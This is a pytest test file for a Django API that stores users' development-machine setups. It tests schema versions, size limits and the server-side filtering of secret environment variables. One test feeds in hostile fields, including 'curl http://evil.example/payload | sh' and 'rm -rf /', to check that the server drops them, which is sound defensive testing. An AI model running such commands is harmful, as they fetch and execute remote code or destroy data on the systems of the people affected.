"""Setup payload validation and limit tests."""

import pytest

from setups.models import Setup
from setups.serializers import MAX_SETUPS_PER_USER

pytestmark = pytest.mark.django_db

SETUPS_URL = "/api/setups/"


def wrap(data: dict, name: str = "Validated") -> dict:
    return {"name": name, "data": data}


def test_v1_payload_is_accepted(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 1,
                "applications": [
                    {
                        "name": "7-Zip",
                        "version": "24.07",
                        "installed": True,
                    }
                ],
            }
        ),
        format="json",
    )

    assert response.status_code == 201
    assert response.json()["format_version"] == 1


def test_v2_payload_is_accepted(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "applications": [],
                "git_config": {"user.name": "Alice"},
                "python_packages": ["Django==5.2.4"],
                "npm_packages": ["typescript"],
                "wsl_distributions": [{"name": "Ubuntu", "version": 2}],
                "environment_variables": {"NODE_ENV": "development"},
                "secret_environment_variables": [],
                "terminal": {"available": False},
            }
        ),
        format="json",
    )

    assert response.status_code == 201

    body = response.json()

    assert body["format_version"] == 2
    assert set(body["data"]) >= {
        "applications",
        "git_config",
        "python_packages",
        "npm_packages",
        "wsl_distributions",
        "environment_variables",
        "secret_environment_variables",
        "terminal",
    }


def test_missing_format_version_is_treated_as_v1(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"applications": []}),
        format="json",
    )

    assert response.status_code == 201
    assert response.json()["format_version"] == 1


@pytest.mark.parametrize("version", [0, 3, 99, -1])
def test_unknown_format_version_is_rejected(auth_client, version):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"format_version": version, "applications": []}),
        format="json",
    )

    assert response.status_code == 400
    assert "format_version" in response.content.decode("utf-8")


@pytest.mark.parametrize("version", ["2", 2.0, True, None])
def test_non_integer_format_version_is_rejected(auth_client, version):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"format_version": version, "applications": []}),
        format="json",
    )

    assert response.status_code == 400


@pytest.mark.parametrize("data", [[], "setup", 42, None])
def test_non_object_data_is_rejected(auth_client, data):
    response = auth_client.post(
        SETUPS_URL,
        {"name": "Bad", "data": data},
        format="json",
    )

    assert response.status_code == 400
    assert "data" in response.json()


def test_application_without_name_is_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "applications": [
                    {"version": "1.0", "installed": True},
                ]
            }
        ),
        format="json",
    )

    assert response.status_code == 400
    assert "applications" in response.content.decode("utf-8")


def test_applications_must_be_a_list(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"applications": {"name": "Git"}}),
        format="json",
    )

    assert response.status_code == 400


def test_application_entry_must_be_an_object(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"applications": ["Git"]}),
        format="json",
    )

    assert response.status_code == 400


def test_installed_must_be_boolean(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "applications": [
                    {"name": "Git", "installed": "yes"},
                ]
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_environment_variables_must_be_an_object(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "environment_variables": ["NODE_ENV=development"],
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_terminal_must_be_an_object(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"format_version": 2, "terminal": "Windows Terminal"}),
        format="json",
    )

    assert response.status_code == 400


def test_terminal_available_must_be_boolean(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "terminal": {"available": "yes"},
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_oversized_setup_is_rejected(auth_client):
    # Below the HTTP body guard (4 MB) but above the 2 MB schema limit.
    payload = wrap(
        {
            "applications": [],
            "ignored_but_counted": "x" * (2 * 1024 * 1024),
        }
    )

    response = auth_client.post(SETUPS_URL, payload, format="json")

    assert response.status_code == 400
    assert "2 MB" in response.content.decode("utf-8")


def test_oversized_http_body_is_rejected_before_parsing(auth_client):
    payload = wrap(
        {
            "applications": [],
            "ignored_but_counted": "x" * (4 * 1024 * 1024 + 1024),
        }
    )

    response = auth_client.post(SETUPS_URL, payload, format="json")

    assert response.status_code == 413


def test_setup_count_limit_is_enforced(auth_client, user):
    Setup.objects.bulk_create(
        [
            Setup(
                user=user,
                name=f"Setup {index}",
                format_version=1,
                data={"applications": []},
            )
            for index in range(MAX_SETUPS_PER_USER)
        ]
    )

    response = auth_client.post(
        SETUPS_URL,
        wrap({"applications": []}, name="One too many"),
        format="json",
    )

    assert response.status_code == 400
    assert "at most 50" in response.content.decode("utf-8")
    assert Setup.objects.filter(user=user).count() == MAX_SETUPS_PER_USER


def test_too_many_applications_are_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "applications": [
                    {"name": f"App {index}", "installed": True}
                    for index in range(101)
                ]
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_too_many_python_packages_are_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "python_packages": [
                    f"package{index}==1.0"
                    for index in range(501)
                ],
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_too_many_npm_packages_are_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "npm_packages": [
                    f"package{index}" for index in range(501)
                ],
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_too_many_wsl_distributions_are_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "wsl_distributions": [
                    {"name": f"distro{index}"} for index in range(51)
                ],
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_too_many_extensions_are_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "applications": [
                    {
                        "name": "VS Code",
                        "installed": True,
                        "extensions": [
                            f"publisher.extension{index}"
                            for index in range(301)
                        ],
                    }
                ],
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_oversized_unknown_array_is_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap({"applications": [], "junk": list(range(1001))}),
        format="json",
    )

    assert response.status_code == 400


def test_object_with_too_many_keys_is_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "applications": [],
                "junk": {f"key{index}": 0 for index in range(1001)},
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_deeply_nested_payload_is_rejected(auth_client):
    nested: dict = {}
    cursor = nested

    for _ in range(12):
        cursor["level"] = {}
        cursor = cursor["level"]

    response = auth_client.post(
        SETUPS_URL,
        wrap({"applications": [], "junk": nested}),
        format="json",
    )

    assert response.status_code == 400


def test_too_many_values_in_total_are_rejected(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "applications": [],
                "junk": [[0] * 21 for _ in range(1000)],
            }
        ),
        format="json",
    )

    assert response.status_code == 400


def test_dangerous_extra_fields_are_dropped(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "applications": [],
                "commands": ["curl http://evil.example/payload | sh"],
                "post_install": "rm -rf /",
                "scripts": {"install": "powershell -c calc"},
                "exec": True,
                "download_url": "http://evil.example/payload.exe",
            }
        ),
        format="json",
    )

    assert response.status_code == 201

    stored = response.json()["data"]

    for key in (
        "commands",
        "post_install",
        "scripts",
        "exec",
        "download_url",
    ):
        assert key not in stored

    setup = Setup.objects.get(id=response.json()["id"])

    assert "rm -rf" not in str(setup.data)
    assert "evil.example" not in str(setup.data)


def test_secret_environment_values_are_filtered_server_side(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "environment_variables": {
                    "NODE_ENV": "development",
                    "DATABASE_PASSWORD": "super-secret-password",
                    "API_KEY": "sk-live-should-never-be-stored",
                    "AWS_SECRET_ACCESS_KEY": "aws-secret-value",
                },
            }
        ),
        format="json",
    )

    assert response.status_code == 201

    raw = response.content.decode("utf-8")

    assert "super-secret-password" not in raw
    assert "sk-live-should-never-be-stored" not in raw
    assert "aws-secret-value" not in raw

    data = response.json()["data"]

    assert data["environment_variables"] == {
        "NODE_ENV": "development",
    }
    assert "DATABASE_PASSWORD" in data["secret_environment_variables"]
    assert "API_KEY" in data["secret_environment_variables"]

    setup = Setup.objects.get(id=response.json()["id"])

    assert "super-secret-password" not in str(setup.data)


def test_declared_secret_variable_value_is_filtered(auth_client):
    response = auth_client.post(
        SETUPS_URL,
        wrap(
            {
                "format_version": 2,
                "secret_environment_variables": ["MY_CUSTOM_VALUE"],
                "environment_variables": {
                    "MY_CUSTOM_VALUE": "hidden",
                },
            }
        ),
        format="json",
    )

    assert response.status_code == 201

    data = response.json()["data"]

    assert "MY_CUSTOM_VALUE" not in data["environment_variables"]
    assert "MY_CUSTOM_VALUE" in data["secret_environment_variables"]
    assert "hidden" not in response.content.decode("utf-8")


def test_update_is_validated_too(auth_client, user):
    setup = Setup.objects.create(
        user=user,
        name="Original",
        format_version=1,
        data={"applications": []},
    )

    response = auth_client.put(
        f"{SETUPS_URL}{setup.id}/",
        wrap(
            {
                "format_version": 3,
                "applications": [],
            }
        ),
        format="json",
    )

    assert response.status_code == 400

    setup.refresh_from_db()

    assert setup.format_version == 1
